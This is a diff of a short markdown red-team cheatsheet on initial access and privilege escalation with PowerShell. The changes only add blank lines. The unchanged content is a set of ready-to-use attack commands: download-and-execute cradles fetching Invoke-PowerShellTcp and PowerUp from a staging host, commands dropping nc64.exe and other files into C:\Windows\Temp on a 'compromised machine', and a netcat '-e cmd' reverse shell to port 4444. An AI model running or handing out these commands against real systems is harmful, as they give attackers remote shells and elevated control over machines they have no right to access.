@@ -13,12 +13,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 Red Team Cheatsheet to preform Initial Access & Privilege Escalation with powershell
 
+
+
 **Command** ([[Powershell Reverse shell]]):
 
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.10 -Port 4444
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Download nc binary.]]):
 
@@ -27,12 +35,24 @@ Invoke-WebRequest "http://192.168.1.10:8080/tools/bin/nc64.exe" -OutFile "C:\Win
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Download PowerUp and check for privilege escalation vectors]]):
 
 ```bash
 IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/PowerUp.ps1');Invoke-AllChecks
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Download and save file to compromised machine]]):
 
@@ -41,9 +61,21 @@ Invoke-WebRequest "http://192.168.1.10:8080/tools/ps/SomeBS.ps1" -OutFile "C:\Wi
 
 ```
 
+
+
+
+
+
+
 **Command** ([[Full path of 64 bit powershell binary to get a 64 bit reverseshell]]):
 
 ```powershell
 C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe -C "C:\Windows\Temp\nc.exe -e cmd 192.168.1.10 4444"
 
 ```
+
+
+
+
+
+
